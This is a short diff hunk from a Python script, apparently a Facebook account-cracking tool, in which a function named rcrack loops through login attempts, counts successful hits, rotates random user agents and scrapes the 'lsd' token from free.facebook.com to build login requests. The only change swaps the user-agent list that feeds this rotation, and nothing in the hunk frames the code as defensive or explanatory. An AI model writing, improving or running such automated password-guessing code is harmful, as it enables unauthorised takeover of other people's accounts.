@@ -215,7 +215,7 @@ def rcrack(uid,pwx,tl):
 			session = requests.Session()
 			sys.stdout.write('\r[%s] [OK:%s]'%(loop,len(oks))),
 			sys.stdout.flush()
-			pro = random.choice(agents)
+			pro = random.choice(ugen)
 			free_fb = session.get('https://free.facebook.com').text
 			log_data = {
 				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
